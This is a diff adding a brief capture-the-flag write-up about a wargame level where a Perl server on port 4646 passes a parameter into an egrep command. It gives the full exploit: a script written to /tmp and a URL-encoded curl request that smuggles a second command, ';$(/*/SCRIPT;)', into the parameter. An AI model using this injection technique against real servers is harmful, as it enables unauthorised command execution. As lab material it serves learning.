@@ -1,0 +1,10 @@
+
+in this level we find a perl server listening on 4646 and there is a egrep command that can take an argument x,
+we can inject a commnad in this argument
+
+echo '#!/bin/bash' > /tmp/SCRIPT
+echo 'getflag > /tmp/pass' >> /tmp/SCRIPT
+chmod 777 /tmp/SCRIPT
+curl "http://localhost:4646?x=%3B%24%28%2F%2A%2FSCRIPT%3B%29" (x = ;$(/*/SCRIPT;))
+cat /tmp/pass
+
